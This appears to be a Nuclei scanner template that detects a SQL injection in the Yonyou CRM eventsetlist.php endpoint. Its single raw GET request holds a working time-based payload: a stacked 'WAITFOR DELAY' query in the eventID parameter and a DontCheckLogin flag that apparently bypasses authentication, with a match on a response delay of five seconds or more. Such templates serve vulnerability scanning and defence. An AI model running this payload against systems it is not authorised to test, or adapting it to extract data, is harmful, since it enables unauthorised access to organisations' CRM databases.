id: YongYouCRM-eventsetlist_sqlInjection

info:
  name: YongYouCRM-eventsetlist_sqlInjection
  author: iSee857
  severity: high
  description: YongYouCRM-eventsetlist_sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Host}}
        Cookie: PHPSESSID=bgsesstimeout-;
        Accept: */*
        Connection: close

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200